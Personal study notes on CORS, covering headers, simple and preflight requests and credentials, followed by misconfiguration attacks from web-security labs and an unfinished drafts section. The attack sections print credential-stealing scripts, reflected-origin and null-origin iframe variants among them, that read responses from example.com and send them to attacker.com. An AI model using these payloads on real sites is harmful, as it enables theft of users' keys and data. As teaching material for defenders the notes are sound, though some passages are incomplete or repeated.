---
created: 2026-05-16
---

## CORS

>**Cross-Origin Resource Sharing (CORS)** is an HTTP-header based mechanism that allows a web server to specify any origins (domain + scheme + port) other than its own from which a browser should permit loading resources.

- The [[SOP]] (Same-Origin Policy) prevents JavaScript from reading resources belonging to a different origin.
- CORS acts as a controlled exception to SOP by allowing a server to explicitly declare which origins may access its resources.

>[!important] CORS rules are defined by the server and enforced by the browser.


>[!note]+ SOP governs what cross-origin JavaScript can _do_:
> 
> - JavaScript **can** send cross-origin requests (`fetch`, `XMLHttpRequest`, form submissions). This is the mechanism [[CSRF]] exploits.
> - JavaScript **cannot** read cross-origin responses by default. This is what CORS relaxes.
> - Certain passive resource loads (images, scripts, stylesheets) are allowed cross-origin, but JavaScript cannot programmatically access their content.

> [!important] SOP does not prevent the _sending_ of cross-origin requests. It prevents the _reading_ of cross-origin _responses_. CORS carves out controlled exceptions to that read restriction. A CORS misconfiguration does not enable an attacker to send requests they couldn't otherwise — it enables them to _read the responses_ to requests that already go through.


### How CORS works

- When a browser makes requests, it automatically adds the `Origin` HTTP request header specifying where this request comes from.

```http
Origin: example.com
```

- If that request goes to a URL on the same origin, the browser allows it with no questions asked.
- However, if that request goes to a URL on a different origin, it is called a **cross-origin request**. 
- By default, a website can send cross-origin requests but not responses to them. This is enforced by the [[SOP]]. 
- To be able to read the response using JavaScript, the server the request is sent to needs to add `example.com` to its CORS rule:

```http
Access-Control-Allow-Origin: example.com
```

>[!important] The browser often sends the request normally (for simple requests) and only evaluates the CORS policy after receiving the response.

1. JavaScript initiates a cross-origin request.
2. The browser includes an `Origin` header identifying the requesting origin.
3. The server responds with one or more CORS headers.
4. The browser evaluates the CORS policy.
5. If the policy allows access, the response is exposed to JavaScript.
6. Otherwise, the browser blocks access to the response and raises a CORS error.

```
JavaScript
    │
    │ GET /api/users
    │ Origin: https://app.example
    ▼
Server
    │
    │ Access-Control-Allow-Origin: https://app.example
    ▼
Browser
    │
    ├─ Origin allowed → Response exposed to JS
    └─ Origin denied  → Response blocked
```
### CORS headers

- CORS rules are controlled by HTTP headers defined on the server side.

#### Response headers

- [`Access-Control-Allow-Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Access-Control-Allow-Origin) (`ACAO`)
	- Specifies the origin(s) allowed to read this response.
	
	```HTTP
	Access-Control-Allow-Origin: https://example.com
	Access-Control-Allow-Origin: *
	```
	
	- Only one value is permitted per header.
	- When set to a specific origin, only that origin gets read access.
	- A wildcard `*` means **any origin** can read the response (but only if `Access-Control-Allow-Credentials: false`).

>[!important]+ A wildcard can't be used if credentials are allowed (`Access-Control-Allow-Credentials: true`).
>- `Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Credentials: true` is rejected.

> [!note]+ When a server supports multiple origins, it typically reads the value of the request's `Origin` header and reflects that value in `Access-Control-Allow-Origin` if the origin is present in an allowlist.
> 
> - In this case, the response should also include:
> 
> ```
> Vary: Origin
> ```
>to ensure caches treat responses for different origins separately.

- [`Access-Control-Allow-Credentials`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Access-Control-Allow-Credentials) (`ACAC`)
	- Indicates whether credentials (e.g., cookies, client certificates, authentication headers) can be included in cross-origin requests. 
	- Can either be set to `true` or omitted (false by default).
	- Sent in responses to preflight (`OPTIONS`) requests (see [[#Preflight requests]]).
	- Must not be `true` when `Access-Control-Allow-Origin` is `*`.
	
	```HTTP
	Access-Control-Allow-Credentials: true
	```

>[!note] By default, cross-origin requests do not include cookies, `Authorization` header, or client certificates. This is enforced by [[SOP]] and [[CSRF#SameSite cookie attribute|SameSite cookie attribute]] to mitigate [[CSRF]] attacks. 

- [`Access-Control-Allow-Methods`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Access-Control-Allow-Methods)
	- Specifies which HTTP methods are permitted in cross-origin requests.
	- Sent in responses to preflight (`OPTIONS`) requests (see [[#Preflight requests]]).

	```HTTP
	Access-Control-Allow-Methods: GET, POST, PUT, DELETE
	```

- [`Access-Control-Allow-Headers`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Access-Control-Allow-Headers)
	- Specifies which request headers are permitted in cross-origin requests. 
	- Sent in responses to preflight (`OPTIONS`) requests (see [[#Preflight requests]]).
	- A wildcard `*` means **all headers** are allowed (but only if `Access-Control-Allow-Credentials: false`).
	- In requests with credentials, `*` is treated as the literal header name, not a wildcard.
	- The `Authorization` header is not covered by the wildcard and must always be explicitly listed if required.

	```HTTP
	Access-Control-Allow-Headers: X-Custom-Header, Upgrade-Insecure-Requests
	```

- [`Access-Control-Expose-Headers`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Access-Control-Expose-Headers)
	- Lists response headers that are safe to expose to client JavaScript.
	- By default, browsers only expose a limited set of headers to JS (`Cache-Control`, `Content-Language`, etc.). This header expands that list.
	- Sent in responses to preflight (`OPTIONS`) requests (see [[#Preflight requests]]).
	
	```HTTP
	Access-Control-Expose-Headers: Content-Endoding
	```

>[!note] By default, JavaScript can only read a small set of [CORS-safelisted response headers](https://developer.mozilla.org/en-US/docs/Glossary/CORS-safelisted_response_header): [`Cache-Control`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cache-Control), [`Content-Language`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Language), [`Content-Length`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Length), [`Content-Type`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Type), [`Expires`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Expires), [`Last-Modified`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Last-Modified), [`Pragma`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Pragma). The `Access-Control-Expose-Headers` allows the server to specify other readers JavaScript can read. 

- [`Access-Control-Max-Age`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Access-Control-Max-Age)
	- Specifies for how long (in seconds) the result to the preflight request (i.e., information from the `Access-Control-Allow-Methods` and `Access-Control-Allow-Methods`) can be cached. 
	- Sent in responses to preflight (`OPTIONS`) requests (see [[#Preflight requests]]).
	
	```HTTP
	Access-Control-Max-Age: 86400
	```

>[!warning]+ Wildcards can be used only as a standalone value, but not as part of other headers.
>- For example, this is **invalid**:
>```HTTP
>Access-Control-Allow-Origin: https://*.example.com
>```

### Request headers

- [`Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Origin)
	- Specifies the origin (scheme + host + port) of the script that made a request, indicates where the request originates from.
	- This header is **mandatory** in all cross-origin requests initiated by browsers.

```HTTP
Origin: https://example.com
```

- [`Access-Control-Request-Method`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Access-Control-Request-Method)
	- Sent in a preflight `OPTIONS` request to specify the HTTP method of the actual request that will follow. 
	- The server uses this data to determine whether to permit or deny the actual request method (e.g., `PUT`, `DELETE`).

```HTTP
Access-Control-Request-Method: PUT
```

- [`Access-Control-Request-Headers`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Access-Control-Request-Headers)
	- Sent in preflight to list the HTTP headers that will be sent in the actual request.
	- The server then checks if the requested headers (often custom ones like `Authorization` or `X-Custom-Header`) are allowed.

```HTTP
Access-Control-Request-Headers: X-PINGOTHER, Content-Type
```


### Simple vs. preflight request

CORS uses two types of requests:
- **Simple requests**
	- Send directly without any prior checks
- **Preflight requests**
	- Initiated only after a preliminary `OPTIONS` request used to verify permissions.

#### Simple requests

>A **simple request** is a cross-origin HTTP request that the browser considers safe enough to send directly without preflighting.

- A request is classified as simple when all of the following hold:
	- **HTTP method** is `GET`, `HEAD`, or `POST`.
	- **HTTP request headers** are limited to the safe-listed set:
		- `Accept`
		- `Accept-Language`
		- `Content-Language`
		- `Content-Type` (with restrictions)
		- `DPR`
		- `Downlink`
		- `Save-Data`
		- `Viewport-Width`
		- `Width`
	- If **`Content-Type`** is present, it's set to one of:
		- `application/x-www-form-urlencoded`	    
		- `multipart/form-data`
		- `text/plain`
	- If the request is made using **JavaScript `XMLHttpRequest` (XHR)**, it must not specify any custom event handlers on upload streams (`xhr.upload.addEventListener()`).
	- The request must not use [`ReadableStream`](https://developer.mozilla.org/en-US/docs/Web/API/ReadableStream) object.


- If these conditions are met, the browser **sends the actual request immediately** with the `Origin` header included. Then the browser inspects the server's response headers to decide if the response data is accessible to the client JS.



Here is an example of how simple requests work:

1. **Simple request:** The browsers sends a `GET` request and includes the `Origin` header to specify the origin of the page this request comes from.

>[!example]+
> ```JS
> async function fetchData() {
>   try {
>    const response = await fetch('https://server.com/data.json', {
>    method: 'GET',
>    headers: {
>      'Origin': ' https://example.com'
>      }
>    });
>    const data = await response.json(); 
>    console.log(data);
>    } catch (error) {
>    console.error(error);
>   } 
> }
> ```

2. **Server response with CORS headers:** The server checks the `Origin` header against the list of its allowed origins. If the request is authorized, the server responds with specific CORS headers that grant access to the requested resource (e.g., `Access-Control-Allow-Origin`).

>[!example]+
> ```JS
> app.get('/data', (req, res) => {
>   const allowedOrigins = ['https://example.com', 'https://another-example.com'];
>   const requestOrigin = req.headers.origin;
> 
>   if (allowedOrigins.includes(requestOrigin)) {
>     res.header('Access-Control-Allow-Origin', requestOrigin);
>     res.header('Access-Control-Allow-Methods', 'GET');
>     res.status(200).json({ data: 'Response data' });
>   } else {
>     res.status(403).json({ error: 'Unauthorized origin' });
>   }
> });
> ```

>[!quote] 
>When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the `Access-Control-Allow-Origin` header so that access is granted.
>Source: [`Cross-origin resource sharing (CORS) — PortSwigger Web Security Academy`](https://portswigger.net/web-security/cors#server-generated-acao-header-from-client-specified-origin-header)

3. **Browser check and access decision:** The browser receives the response along with CORS headers. It verifies that the requesting origin matches the allowed origins specified in the `Access-Control-Allow-Origin` header. If they match, the browser allows access.

4. **Blocking authorized access:** If the requested origin is not in the approved list or if CORS headers are missing, the browser **blocks the response** and throws a CORS error to the console.
#### Preflight requests

>When a CORS request does **not** satisfy the conditions for a simple request (**complex request**), browsers perform a **preflight** to verify permissions.

Here's how preflight requests work:

1. **Preflight request** 
	- When the browser detects that JavaScript wants to make a complex request, it automatically sends a **preflight [`OPTIONS`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods/OPTIONS) request** to the server before the actual request.
	- This preflight request includes the following headers:
		- `Origin`: The origin of the requesting site.
		- `Access-Control-Request-Method`: The HTTP method of the actual request.
		- `Access-Control-Request-Headers`: A list of any custom headers used in the request.

```HTTP
OPTIONS /resources/post/ HTTP/1.1
Host: one.example
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Connection: keep-alive
Origin: https://two.example
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type,x-pingother
```

2. **Server response:** The server responds with to the preflight with appropriate CORS headers to inform the browser whether the actual request is allowed. The relevant headers include:
	- `Access-Control-Allow-Origin`: The origins allowed to access the resource; must match the origin of the requesting site or be set to `*` (a wildcard; allows any origin) for the actual request to be allowed.
	- `Access-Control-Allow-Methods`: HTTP methods allowed for the actual request; must include the method of the actual request for it to be sent.
	- `Access-Control-Allow-Headers`: Custom HTTP headers allowed for the actual request; must include all requested headers for the actual request to be sent.
	- `Access-Control-Max-Age`: Optional; duration (in seconds) for which browsers can cache the preflight result to avoid repeated preflights.

```HTTP
HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 01:15:39 GMT
Server: Apache/2.0.61 (Unix)
Access-Control-Allow-Origin: https://one.example
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: X-PINGOTHER, Content-Type
Access-Control-Max-Age: 86400
Vary: Accept-Encoding, Origin
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
```

3. **Browser decision:** Based on the response from the server's preflight request, the browser decides whether to proceed with the actual request.
	- If the server responds with appropriate headers indicating that the actual request is allowed, the browser sends the actual request. 
	- If the server does not provide the necessary headers or explicitly denies the request, the browser generates a CORS error and does not send the actual request.

4. **Actual request:** If the preflight request is successful, the browser sends the actual request to the server with the appropriate headers. The server processes the request and responds to it.



### Credentials

>**Credentials** refer to any data in HTTP requests that identifies or authenticates a user. This includes cookies, HTTP authentication headers (e.g., Basic, Bearer, Digest), and client-side TLS certificates. 

>[!important] By default, browsers do not send credentials in cross-origin requests.
>This means that unless a script specifically opts in, requests like `fetch()` or `XMLHttpRequest` to another origin will **not** include cookies or HTTP authentication headers. This is because of the SOP, and is used to protect against CSRF attacks.

To include credentials in cross-origin requests, two things must happen:

1. **Client-side JavaScript explicitly opts-in**

>[!example]+ `XMLHttpRequest`:
> 
> ```JS
> var xhr = new XMLHttpRequest();
> xhr.open('GET', 'https://api.example.com/data');
> xhr.withCredentials = true;
> xhr.send();
> ```
> 

>[!example]+ Fetch API:
>
>```JS
>fetch('https://api.example.com/data', { credentials: 'include' });
>```

2. **The server explicitly allows credentials**
	- The server can explicitly allow requests from different origins to include credentials by setting the `Access-Control-Allow-Credentials` header to `'true'`.
	- Only if the server sends this header, will the browser actually expose the response to the originating page's JavaScript if credentials were sent.

```HTTP
Access-Control-Allow-Credentials: true
```

>[!important]+
>`Access-Control-Allow-Origin` **cannot** be set to the wildcard `*` when `Access-Control-Allow-Credentials` is `true` (for security reasons).
## CORS misconfigurations

- Reflecting arbitrary origin in `Access-Control-Allow-Origin`
- Flawed `Origin` validation
- White-listed `null` origin

### Reflected origin (dynamic trust-all)

- Some applications need to provide access to a number of different origins. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route.

>[!bug] 
>The server reads the `Origin` request header and reflects it directly into the `Access-Control-Allow-Origin` response header, with no validation whatsoever.

- Because the application reflects arbitrary origins in the `Access-Control-Allow-Origin` header, this means that absolutely any domain can access resources from the vulnerable domain.

>[!example]+
> If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:
> 
> ```js
> var req = new XMLHttpRequest(); 
> 
> req.onload = reqListener; 
> req.open('get','https://example.com/api-keys',true); 
> req.withCredentials = true;
> req.send(); 
> 
> function reqListener() { 
> 	location='//attacker.com/log?key='+this.responseText; 
> };
> ```
> 
> - `var req = new XMLHttpRequest();` creates an `XMLHttpRequest` object.
> - `req.onload = reqListener;` registers a callback function; when the request completes (after `send()`), the `reqListener()` will run.
> - `req.open('get', 'https://example.com/api-keys', true);` prepares a `GET` request.
> - `req.withCredentials = true;` tells the browser to include cookies and other credentials with the request (if allowed by the target site's CORS rules).
> - `req.send();` sends the request.
> - When the response writes, the `reqListener()` function redirects the browser to `attacker.com` and includes the response data (`this.responseText`) as a query parameter.


>[!bug]+ Labs
>- [[🛠️ CORS labs#1. CORS vulnerability with basic origin reflection]]

### Flawed `Origin` validation

>[!bug]
>The server attempts to validate the origin but only checks a part of the URL (e.g., start or end) or uses a flawed regex pattern.


- For bypasses, see [`URL validation bypass cheat sheet — PortSwigger Web Security Academy`](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet):

![[CORS_URL_bypass.png]]

### Null origin

>[!bug]+
>The server trusts the literal string `null` as an origin value. 

- Browsers might send the `Origin: null` when the request originates from an **opaque origin** or when exposing the true origin would be privacy-sensitive. Common cases include:
	- Origins those scheme is not `http`, `https`, `ftp`, `ws`, `wss`, or `gopher` (e.g., `file:` and `data:` URLs).
	- Documents created programmatically (e.g., via `createDocument()`) or generated from `data:` URLs.
	- Documents served with the [[CSP]] `sandbox` directive without `allow-same-origin`. For example, `<iframe sandbox>` elements whose sandbox attribute does not include `allow-same-origin`.
	- Cross-Origin redirects. 

>[!note] `null` origins are often used during local development. Misconfigurations might end up in production.

- In this case, you can use various tricks to generate cross-origin requests containing a value of `null` in the `Origin` header to get cross-domain access.

- For example, via sandboxed `iframe`:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://example.com/api-keys',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://attacker.com/capture?data='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

- The [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe#sandbox) attribute controls the restrictions applied to the content embedded in the `<iframe>`. 
	- If the value of the attribute is empty, all restrictions apply.
	- `allow-scripts` allows the page to run scripts (but **not** create pop-up windows). If this keyword is not used, the operation is not allowed.
	- `allow-top-navigation` allows the resource navigate the top-level browsing context (the one named `_top`).
	- `allow-forms` allows the page to submit forms. If this keyword is not used, the form will be displayed as normal, but submitting it won't trigger client-side input validation or send data to the server. 

>[!important] Without `allow-same-origin`, the resource is treated as being from a special origin. The `Origin` header in requests made from within the `<iframe>` is set to `null`.


>[!note]- `src` + `data:text/html` URL instead of `srcdoc`
> ```html
> <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
>     var req = new XMLHttpRequest();
>     req.onload = reqListener;
>     req.open('get','https://example.com/api-keys',true);
>     req.withCredentials = true;
>     req.send();
>     function reqListener() {
>         location='https://attacker.com/capture?data='+encodeURIComponent(this.responseText);
>     };
> </script>"></iframe>
> ```


>[!bug]+ Labs
>- [[🛠️ CORS labs#2. CORS vulnerability with trusted null origin]]

### XSS via CORS trust relationships

- If a website trusts an origin that is vulnerable to [[XSS]], then you could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.


### Trusted insecure protocols

>[!bug]
> The target site uses HTTPS correctly, but its CORS policy trusts an HTTP origin.

>[!example]+
> - Suppose an application with the correctly configured TLS, `https://example.com`, receives a request to sensitive data from a subdomain that uses unencrypted HTTP:
> 
> ```http
> GET /api-keys HTTP/1.1
> Host: example.com
> Origin: http://trusted-subdomain.example.com
> Cookie: session=...
> ```
> 
> - The application at `https://example.com` responds with:
> 
> ```http
> HTTP/1.1 200 OK 
> Access-Control-Allow-Origin: http://trusted-subdomain.example.com 
> Access-Control-Allow-Credentials: true
> ```
> 
> - Which means JavaScript running on `http://trusted-subdomain.example.com` is allowed to read sensitive responses from `https://example.com`.
> ---
> - In this situation, if you can intercept a victim user's traffic, you can exploit the CORS configuration to compromise the victim's interaction with the application:
> 
> 1. The victim is logged into `https://example.com`; their requests carry session cookies. Suppose they visit any HTTP page (`http://whether.com` or whatever).
> 2. You intercept the response and change it into a redirect:
> 
> 	```http
> 	302 Found HTTP/1.1
> 	Location: http://trusted-subdomain.example.com
> 	```
> 
> 3. The victim's browser follows the redirect and navigates to `http://trusted-subdomain.example.com`, i.e., their browser sends a `GET` to `trusted-subdomain.example.com` (which is still HTTP).
> 
> 	```http
> 	GET / HTTP/1.1
> 	Host: trusted-subdomain.example.com
> 	```
> 
> 4. You intercept the response to that `trusted-domain` and inject a page that makes a CORS request to `https://example.com`:
> 
> 	```http
> 	<script>
> 	fetch(
> 	  "https://example.com/api-keys",
> 	  {
> 	    credentials:"include"
> 	  }
> 	)
> 	</script>
> 	```
> 
> 5. The victim's browser loads your controlled JavaScript and makes the CORS request. The `Origin` of the request is `http://trusted-subdomain.example.com` (not anything related to you, but the trusted subdomain — with HTTP scheme). The cookies are included in the request. 
> 
> 	```http
> 	GET /api-keys
> 	Host: example.com
> 	Origin:
> 	http://trusted-subdomain.example.com
> 	Cookie: session=...
> 	```
> 
> 6. The application (`https://example.com`) checks CORS and allows the request because this is a whitelisted origin. So it responds with:
> 
> 	```http
> 	...
> 	Access-Control-Allow-Origin:
> 	http://trusted-subdomain.example.com
> 	Access-Control-Allow-Credentials: true
> 	...
> 	```
> 	+
> 	```json
> 	{
> 	  "apiKey":"secretkey"
> 	}
> 	```
> 
> 7. Your spoofed page can read the sensitive data and transmit it to any origin of your control — because the browser things it is `http://trusted-subdomain.example.com`:
> 
> 	```js
> 	fetch(
> 	  "https://attacker.com/capture",
> 	  {
> 	     method:"POST",
> 	     body:data
> 	  }
> 	)
> 	```
> 
## Trusted insecure protocols

Many websites configure CORS to allow access from their subdomains. However, if the server also trusts insecure schemes like HTTP, an attacker can **intercept HTTP request** to the insecure subdomain, **spoof response** to cause a cross-origin request, and then steal data.

Suppose an application trusts its subdomains under both HTTP and HTTPS:

```
https://trusted.example.com
http://trusted.example.com
```

1. A victim, logged into `example.com`, visits or is tricked to load any content from the insecure `http://trusted.example.com` (e.g., with an open redirect). All traffic to and from the domain is unencrypted. 

2. The attacker intercepts the HTTP response to the victim from `http://trusted.example.com` and injects a script that issues a cross-origin credentialed request; however, the origin is set to `http://trusted.example.com`, since the script is running in the context of that origin:

```HTML
<script>
  var xhr = new XMLHttpRequest();
  xhr.onload = requestListener; 
  xhr.open('GET', 'https://example.com/api/userdata', true);
  xhr.withCredentials = true;  // send credentials
  xhr.send();

function requestListener() {
    location='https://attacker.com/log?key='+encodeURIComponent(this.responseText);
};
</script>
```

3. The target server validates the HTTP origin and responds with:

```HTTP
...
Access-Control-Allow-Origin: http://trusted.example.com
Access-Control-Allow-Credentials: true
...
```

4. Because the origin is allowed and credentials used, the browser exposes the sensitive API response (e.g., user data) to the malicious script. The attacker’s injected script sends this data back to their own server.

----
4. The application allows the request because this is a whitelisted origin. 
5. The requested sensitive data is returned in the response. 
6. The attacker's spoofed page reads the data and and transmits it to an attacker-controlled domain.
## References and further reading

- [`CORS and the Access-Control-Allow-Origin response header — PortSwigger Web Security Academy`](https://portswigger.net/web-security/cors/access-control-allow-origin)
- [`Cross-origin resource sharing (CORS) — PortSwigger Web Security Academy`](https://portswigger.net/web-security/cors#server-generated-acao-header-from-client-specified-origin-header)

- [`CORS and the Access-Control-Allow-Origin response header — PortSwigger Web Security Academy`](https://portswigger.net/web-security/cors/access-control-allow-origin)
- [`Cross-origin resource sharing (CORS) — PortSwigger Web Security Academy`](https://portswigger.net/web-security/cors#server-generated-acao-header-from-client-specified-origin-header)

- [`CORS Tutorial: A Guide to Cross-Origin Resource Sharing — auth0`](https://auth0.com/blog/cors-tutorial-a-guide-to-cross-origin-resource-sharing/)

- [`Cross-Origin Resource Sharing (CORS) — mdn web docs`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS#preflighted_requests)

# drafts



#### `iframe` bypass

The `sandbox` attribute enables an extra set of restrictions for the content in the iframe.

```
<iframe src="iframe_sandbox.html" sandbox></iframe>
```

When the `sandbox` attribute is present, and it will:

- treat the content as being from a unique origin
- block form submission
- block script execution
- disable APIs
- prevent links from targeting other browsing contexts
- prevent content from using plugins (through `<embed>`, `<object>`, `<applet>`, or other)
- prevent the content to navigate its top-level browsing context
- block automatically triggered features (such as automatically playing a video or automatically focusing a form control)

hence, when the `sandbox` attribute is set, the content of the inline frame is not allowed to run scripts.

#### `postMessage()` exploitation

- [`Window: postMessage() method`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)

#### CORS proxy

#### HTML `Form` tag

#### JSONP and cache

JSONP (JSON with Padding) is a method for sending JSON data without worrying about cross-domain issues. if appropriate protection against data leaking is not provided, the website might be vulnerable to the SOP bypass through the JSONP and browser cache.

The HTTP cache stores a response associated with a request and reuses the stored response for subsequent requests.

First, since there is no need to deliver the request to the origin server, then the closer the client and cache are, the faster the response will be. The most typical example is when the browser itself stores a cache for browser requests. Second, when a response is reusable, the origin server does not need to process the request — so it does not need to parse and route the request, restore the session based on the cookie, query the DB for results, or render the template engine. That reduces the load on the server.

- only GET responses may be cached.
- When the browser gets the response to its GET request, it checks response headers for caching information.
    - if the response contains a `Cache-Control: private`, or `Cache-Control: public` header, the response is cached for `Cache-Control: max-age=<seconds>`.
    - If the response contains an `Expires` header, the response is cached according to its value (but `Cache-Control` has the higher priority over it).
    - If none of these headers is present, some browsers may check the `Last-Modified` header and typically cache the response for ten percent of the difference between the current date and the `Last-Modified` date.
    - If there are no cache-related headers at all, the browser may cache the response but usually revalidates it before using it.

Problems may arise due to the fact that there is just one browser cache for all websites and it uses only one key to identify data: a normalized absolute URI (_scheme://host:port/path?query_). It means that the browser cache has no additional information about the request that initiated a particular response (for example, the site/origin from which it came, the JavaScript function or tag that initiated it, the associated cookies or headers, etc.).

thus, the attack occurs in the following way:

1. The user visits `first_subdomain.root_domain.com`.
2. A script on `second_subdomain.root_domain.com` needs the information from the first subdomain.
3. The user’s browser sends a request to the JSONP endpoint at `second_subdomain.root_domain.com`.
4. The response from the JSONP endpoint at `second_subdomain.root_domain.com` contains cache-related headers.
5. The user’s browser caches the response content.
6. The user is lured to a malicious site.
7. The malicious site contains a script that points to the JSONP endpoint at `second_subdomain.root_domain.com`.
8. The browser returns the cached response to the script at the malicious site.

because the response comes from the cache, no additional protection is used.




The [[🖉SOP]] (Same-Origin Policy) restricts JavaScript running on one origin from accessing resources on another origin. It's designed to block malicious cross-site interactions, and it's a foundation of modern security in browsers. Namely thanks to the SOP a random attacker can't read sensitive information on other domains using scripts.

However, the SOP is often too restrictive even for legitimate use cases like APIs, CDNs, and third-party integrations. CORS was invented to relax the SOP in a controlled, secure way. 

>**Cross-Origin Resource Sharing (CORS)** is an HTTP-header based mechanism that allows a web server to specify which origins (domain, scheme, and port) are allowed to access resources on the server from a different origin.


>[!example] Example of a cross-origin request
>A website loaded at `https://client.com` uses `fetch()` to retrieve data from `https://api.server.com`. Under SOP, this is disallowed unless `api.server.com` explicitly permits it via CORS.

- To implement CORS, a web server describes which origins are permitted to read information from a web browser in HTTP headers. 
- For unsafe methods, the specifies requires the 

>[!important]
>Each time JavaScript on a web page tries to retrieve resources cross-origin (e.g., via `fetch()`, `XMLHttpRequest`), the browser adds the `Origin` header to the request specifying the origin (scheme + host + port) of the calling page to tell the server from where this request comes from.
>```HTTP
>Origin: https://example.com
>```


- [`Vary: Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Vary)

	
	```http
	Vary: Origin
	```

I have request smuggling and prototype pollution left to master, but would it be better to focus on mystery instead?

| Value                     | Description                                                                                       | Credentials Supported? | Example                                            |
| ------------------------- | ------------------------------------------------------------------------------------------------- | ---------------------- | -------------------------------------------------- |
| **Specific Origin**       | Allows only one origin (e.g., `https://example.com`).                                             | Yes                    | `Access-Control-Allow-Origin: https://example.com` |
| **Wildcard `*`**          | Allows any origin to access the resource.                                                         | No                     | `Access-Control-Allow-Origin: *`                   |
| **Dynamic Reflection**    | Server mirrors the request's `Origin` header if it matches an allowlist. Requires `Vary: Origin`. | Yes (if validated)     | `Access-Control-Allow-Origin: <request-origin>`    |
| **Null origin<br>`null`** |                                                                                                   |                        |                                                    |

